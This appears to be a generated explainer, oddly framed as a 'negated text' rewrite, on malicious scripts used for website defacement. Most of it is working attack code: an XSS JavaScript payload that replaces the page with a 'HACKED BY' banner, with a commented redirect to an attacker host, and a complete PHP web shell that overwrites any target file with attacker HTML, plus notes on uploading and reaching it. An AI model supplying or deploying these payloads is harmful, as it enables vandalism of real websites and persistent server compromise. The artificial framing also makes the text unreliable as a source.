Here's the negated text:

What are some examples of malicious scripts **used** for website defacement?

---

Here's an understandable, comprehensive, and reproducible example containing several paragraphs or code in agreement with the meaning implied by the negated text:

Website defacement, in its simplest form, is unauthorized modification of a website's content and appearance. Threat actors employ various malicious scripts to achieve this, often for political statements, propaganda, or simply to demonstrate their hacking prowess. These scripts are typically injected through vulnerabilities in the web application or server, such as SQL injection, Cross-Site Scripting (XSS), or misconfigured server settings.

One common category of scripts used for website defacement involves injecting **malicious JavaScript**. Attackers exploit XSS vulnerabilities to embed their JavaScript code directly into a webpage. Once a user visits the compromised page, this script executes in their browser. While XSS is often associated with stealing session cookies or redirecting users, a defacement payload might involve:

```javascript
// Example of a defacement JavaScript injected via XSS
// This script replaces the entire body content with a defacement message.
document.body.innerHTML = ''; // Clear existing content
var defacementMessage = document.createElement('div');
defacementMessage.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: black; color: white; display: flex; justify-content: center; align-items: center; font-size: 50px; font-family: Arial, sans-serif; text-align: center;';
defacementMessage.innerHTML = '<h1>HACKED BY [ATTACKER GROUP]!</h1><p>Your security is a joke.</p>';
document.body.appendChild(defacementMessage);

// Optionally, redirect after a few seconds or play sound
// setTimeout(function() {
//     window.location.href = 'https://attacker.website/proof';
// }, 5000);
```

This JavaScript snippet, when successfully injected, would immediately replace all content on the page with a bold defacement message, typically showing the attacker's handle or a political statement. The use of `position: fixed` and `width: 100%; height: 100%;` ensures it covers the entire viewport, making it highly visible.

Another prevalent method utilizes **server-side scripts or shell commands** injected through vulnerabilities like command injection or remote code execution (RCE). If an attacker can execute arbitrary commands on the server, they can download or create new files, overwrite existing ones, or modify database entries that control website content. A common approach involves uploading a "web shell," which is a malicious script (often written in PHP, ASP, or JSP) that gives the attacker a web-based interface to interact with the server.

Consider a simplified PHP web shell (named `deface.php`) injected into a vulnerable server:

```php
<?php
// PHP Web Shell for Defacement (simplified example)
// In a real scenario, this would be much more sophisticated with authentication etc.

if (isset($_GET['action']) && $_GET['action'] == 'deface') {
    $defacement_content = $_POST['content'] ?? '<h1>Website Defaced!</h1><p>No more data for you!</p>';
    $target_file = $_POST['target_file'] ?? 'index.html'; // Default to index.html

    if (file_put_contents($target_file, $defacement_content) !== false) {
        echo "Successfully defaced " . htmlspecialchars($target_file) . "<br>";
        echo "<pre>" . htmlspecialchars($defacement_content) . "</pre>";
    } else {
        echo "Error defacing " . htmlspecialchars($target_file) . "<br>";
    }
} else {
    // Simple interface for the attacker
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Defacement Panel</title></head>
    <body>
        <h2>Deface Target File</h2>
        <form method="POST" action="?action=deface">
            <label for="target_file">Target File (e.g., index.html, index.php):</label><br>
            <input type="text" id="target_file" name="target_file" value="index.html"><br><br>
            <label for="content">Defacement Content (HTML):</label><br>
            <textarea id="content" name="content" rows="10" cols="80">
                &lt;!DOCTYPE html&gt;
                &lt;html&gt;
                &lt;head&gt;&lt;title&gt;Hacked&lt;/title&gt;&lt;/head&gt;
                &lt;body style="background-color: #333; color: #f00; text-align: center; padding-top: 100px;"&gt;
                    &lt;h1&gt;Site Owner: You Got Pwned!&lt;/h1&gt;
                    &lt;p&gt;Greetings from the Defacement Crew.&lt;/p&gt;
                    &lt;img src="https://example.com/malicious-image.jpg" alt="Defaced" style="max-width: 80%;"&gt;
                &lt;/body&gt;
                &lt;/html&gt;
            </textarea><br><br>
            <input type="submit" value="DEFACE NOW!">
        </form>
    </body>
    </html>
    <?php
}
?>
```

An attacker would upload this `deface.php` file to the web server, typically via a file upload vulnerability or by exploiting another vulnerability to write the file. Once uploaded, they would access it in their browser (e.g., `http://example.com/uploads/deface.php`). The script then provides an interface to specify the target file (like `index.html` or `index.php`) and the defacement content. Upon submission, `file_put_contents` overwrites the target file with the attacker's chosen HTML, effectively defacing the website for all subsequent visitors. This highlights how vulnerabilities, combined with specific malicious scripts, directly lead to website defacement.
